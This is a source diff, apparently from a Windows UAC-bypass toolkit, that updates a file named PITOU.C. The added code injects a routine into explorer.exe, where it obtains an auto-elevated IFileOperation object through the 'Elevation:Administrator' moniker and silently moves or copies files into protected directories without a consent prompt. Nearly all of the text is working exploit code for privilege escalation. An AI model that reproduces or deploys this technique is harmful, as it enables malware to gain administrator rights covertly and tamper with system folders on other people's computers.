@@ -4,9 +4,9 @@
 *
 *  TITLE:       PITOU.C
 *
-*  VERSION:     1.72
+*  VERSION:     1.8
 *
-*  DATE:        28 Apr 2015
+*  DATE:        11 Jul 2015
 *
 *  Leo Davidson work based AutoElevation and Pitou new variant.
 *
@@ -20,6 +20,7 @@
 #include <shlobj.h>
 
 ELOAD_PARAMETERS g_ElevParams;
+ELOAD_PARAMETERS_3 g_ElevParams3;
 
 /*
 * ucmElevatedLoadProc
@@ -167,6 +168,74 @@ DWORD WINAPI ucmElevatedLoadProc(
 }
 
 /*
+* ucmCreateCallParameters
+*
+* Purpose:
+*
+* Fill common part of call parameters.
+*
+*/
+BOOL ucmCreateCallParameters(
+	PVOID Parameters
+	)
+{
+	BOOL bCond = FALSE, bResult = FALSE;
+	PELOAD_PARAMETERS elvpar = (PELOAD_PARAMETERS)Parameters;
+	
+	HINSTANCE   hKrnl, hOle32, hShell32;
+
+	do {
+
+		if (Parameters == NULL) {
+			break;
+		}
+
+		// load/reference required dlls 
+		hKrnl = GetModuleHandle(KERNEL32DLL);
+		if (hKrnl == NULL) {
+			break;
+		}
+		hOle32 = GetModuleHandle(OLE32DLL);
+		if (hOle32 == NULL) {
+			hOle32 = LoadLibrary(OLE32DLL);
+			if (hOle32 == NULL)	{
+				break;
+			}
+		}
+
+		hShell32 = GetModuleHandle(SHELL32DLL);
+		if (hShell32 == NULL) {
+			hShell32 = LoadLibrary(SHELL32DLL);
+			if (hShell32 == NULL) {
+				break;
+			}
+		}
+
+		//elevation moniker
+		_strcpy_w(elvpar->EleMoniker, IFILEOP_ELEMONIKER);
+
+		elvpar->xIID = IID_IFileOperation;
+		elvpar->xIID_IShellItem = IID_IShellItem;
+		elvpar->xCLSID = CLSID_FileOperation;
+
+		elvpar->xCoInitialize = (pfnCoInitialize)GetProcAddress(hOle32, "CoInitialize");
+		elvpar->xCoCreateInstance = (pfnCoCreateInstance)GetProcAddress(hOle32, "CoCreateInstance");
+		elvpar->xCoGetObject = (pfnCoGetObject)GetProcAddress(hOle32, "CoGetObject");
+		elvpar->xCoUninitialize = (pfnCoUninitialize)GetProcAddress(hOle32, "CoUninitialize");
+		elvpar->xSHCreateItemFromParsingName = (pfnSHCreateItemFromParsingName)GetProcAddress(hShell32, "SHCreateItemFromParsingName");
+		elvpar->xShellExecuteExW = (pfnShellExecuteExW)GetProcAddress(hShell32, "ShellExecuteExW");
+		elvpar->xWaitForSingleObject = (pfnWaitForSingleObject)GetProcAddress(hKrnl, "WaitForSingleObject");
+		elvpar->xCloseHandle = (pfnCloseHandle)GetProcAddress(hKrnl, "CloseHandle");
+		elvpar->xOutputDebugStringW = (pfnOutputDebugStringW)GetProcAddress(hKrnl, "OutputDebugStringW");
+
+		bResult = TRUE;
+
+	} while (bCond);
+
+	return bResult;
+}
+
+/*
 * ucmStandardAutoElevation
 *
 * Purpose:
@@ -187,7 +256,7 @@ BOOL ucmStandardAutoElevation(
 	)
 {
 	BOOL		cond = FALSE, bResult = FALSE;
-	HINSTANCE   hKrnl, hOle32, hShell32;
+	//HINSTANCE   hKrnl, hOle32, hShell32;
 	LPWSTR		lpSourceDll, lpTargetDir, lpTargetProcess;
 	WCHAR		szBuffer[MAX_PATH + 1];
 
@@ -229,22 +298,10 @@ BOOL ucmStandardAutoElevation(
 
 	do {
 
-		// load/reference required dlls 
-		hKrnl = GetModuleHandle(KERNEL32DLL);
-		hOle32 = GetModuleHandle(OLE32DLL);
-		if (hOle32 == NULL) {
-			hOle32 = LoadLibrary(OLE32DLL);
-			if (hOle32 == NULL)	{
-				break;
-			}
-		}
-
-		hShell32 = GetModuleHandle(SHELL32DLL);
-		if (hShell32 == NULL) {
-			hShell32 = LoadLibrary(SHELL32DLL);
-			if (hShell32 == NULL) {
-				break;
-			}
+		//setup call parameters
+		RtlSecureZeroMemory(&g_ElevParams, sizeof(g_ElevParams));
+		if (!ucmCreateCallParameters(&g_ElevParams)) {
+			break;
 		}
 
 		//source filename
@@ -284,23 +341,147 @@ BOOL ucmStandardAutoElevation(
 		}
 		OutputDebugStringW(g_ElevParams.ExePathAndName);
 
-		//elevation moniker
-		_strcpy_w(g_ElevParams.EleMoniker, L"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}");
-
-		g_ElevParams.xIID = IID_IFileOperation;
-		g_ElevParams.xIID_IShellItem = IID_IShellItem;
-		g_ElevParams.xCLSID = CLSID_FileOperation;
-
-		g_ElevParams.xCoInitialize = (pfnCoInitialize)GetProcAddress(hOle32, "CoInitialize");
-		g_ElevParams.xCoCreateInstance = (pfnCoCreateInstance)GetProcAddress(hOle32, "CoCreateInstance");
-		g_ElevParams.xCoGetObject = (pfnCoGetObject)GetProcAddress(hOle32, "CoGetObject");
-		g_ElevParams.xCoUninitialize = (pfnCoUninitialize)GetProcAddress(hOle32, "CoUninitialize");
-		g_ElevParams.xSHCreateItemFromParsingName = (pfnSHCreateItemFromParsingName)GetProcAddress(hShell32, "SHCreateItemFromParsingName");
-		g_ElevParams.xShellExecuteExW = (pfnShellExecuteExW)GetProcAddress(hShell32, "ShellExecuteExW");
-		g_ElevParams.xWaitForSingleObject = (pfnWaitForSingleObject)GetProcAddress(hKrnl, "WaitForSingleObject");
-		g_ElevParams.xCloseHandle = (pfnCloseHandle)GetProcAddress(hKrnl, "CloseHandle");
-
 		bResult = ucmInjectExplorer(&g_ElevParams, ucmElevatedLoadProc);
+
+	} while (cond);
+
+	return bResult;
+}
+
+/*
+* ucmElevatedLoadProcEx
+*
+* Purpose:
+*
+* Bypass UAC using AutoElevated IFileOperation.
+* Special version.
+*
+*/
+DWORD WINAPI ucmElevatedLoadProcEx(
+	PELOAD_PARAMETERS_3 elvpar
+	)
+{
+	HRESULT				r;
+	BOOL				cond = FALSE;
+	IFileOperation      *FileOperation1 = NULL;
+	IShellItem			*isrc = NULL, *idst = NULL;
+	BIND_OPTS3			bop;
+	SHELLEXECUTEINFOW   shexec;
+
+	if (elvpar == NULL)
+		return (DWORD)E_FAIL;
+
+	r = elvpar->xCoInitialize(NULL);
+	if (r != S_OK)
+		return r;
+
+	RtlSecureZeroMemory(&bop, sizeof(bop));
+	RtlSecureZeroMemory(&shexec, sizeof(shexec));
+
+	do {
+		r = elvpar->xCoCreateInstance(&elvpar->xCLSID, NULL,
+			CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER, &elvpar->xIID, &FileOperation1);
+
+		if (r != S_OK) {
+			break;
+		}
+
+		if (FileOperation1 != NULL) {
+			FileOperation1->lpVtbl->Release(FileOperation1);
+		}
+
+		bop.cbStruct = sizeof(bop);
+		bop.dwClassContext = CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER;
+		r = elvpar->xCoGetObject(elvpar->EleMoniker, (BIND_OPTS *)&bop, &elvpar->xIID, &FileOperation1);
+		if (r != S_OK) {
+			break;
+		}
+		if (FileOperation1 == NULL) {
+			r = E_FAIL;
+			break;
+		}
+
+		FileOperation1->lpVtbl->SetOperationFlags(FileOperation1,
+			FOF_NOCONFIRMATION | FOF_SILENT | FOFX_SHOWELEVATIONPROMPT | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION);
+
+		r = elvpar->xSHCreateItemFromParsingName(elvpar->SourceFilePathAndName,
+			NULL, &elvpar->xIID_IShellItem, &isrc);
+
+		if (r != S_OK) {
+			break;
+		}
+		r = elvpar->xSHCreateItemFromParsingName(elvpar->DestinationDir, NULL, &elvpar->xIID_IShellItem, &idst);
+		if (r != S_OK) {
+			break;
+		}
+
+		r = FileOperation1->lpVtbl->MoveItem(FileOperation1, isrc, idst, NULL, NULL);
+		if (r != S_OK) {
+			break;
+		}
+		r = FileOperation1->lpVtbl->PerformOperations(FileOperation1);
+		if (r != S_OK) {
+			break;
+		}
+
+		idst->lpVtbl->Release(idst);
+		idst = NULL;
+		isrc->lpVtbl->Release(isrc);
+		isrc = NULL;
+
+	} while (cond);
+
+	if (FileOperation1 != NULL) {
+		FileOperation1->lpVtbl->Release(FileOperation1);
+	}
+	if (isrc != NULL) {
+		isrc->lpVtbl->Release(isrc);
+	}
+	if (idst != NULL) {
+		idst->lpVtbl->Release(idst);
+	}
+
+	elvpar->xCoUninitialize();
+	return r;
+}
+
+/*
+* ucmAutoElevateCopyFile
+*
+* Purpose:
+*
+* Copy file autoelevated.
+*
+*/
+BOOL ucmAutoElevateCopyFile(
+	LPWSTR SourceFileName,
+	LPWSTR DestinationDir
+	)
+{
+	BOOL		cond = FALSE, bResult = FALSE;
+	WCHAR		szBuffer[MAX_PATH + 1];
+
+	do {
+		if (
+			(SourceFileName == NULL) ||
+			(DestinationDir == NULL)
+			)
+		{
+			break;
+		}
+
+		RtlSecureZeroMemory(&g_ElevParams3, sizeof(g_ElevParams3));
+
+		//setup call parameters
+		if (!ucmCreateCallParameters(&g_ElevParams3)) {
+			break;
+		}
+
+		//dest directory
+		RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
+		_strcpy_w(g_ElevParams3.DestinationDir, DestinationDir);
+		_strcpy_w(g_ElevParams3.SourceFilePathAndName, SourceFileName);
+		bResult = ucmInjectExplorer(&g_ElevParams3, ucmElevatedLoadProcEx);
 
 	} while (cond);
 
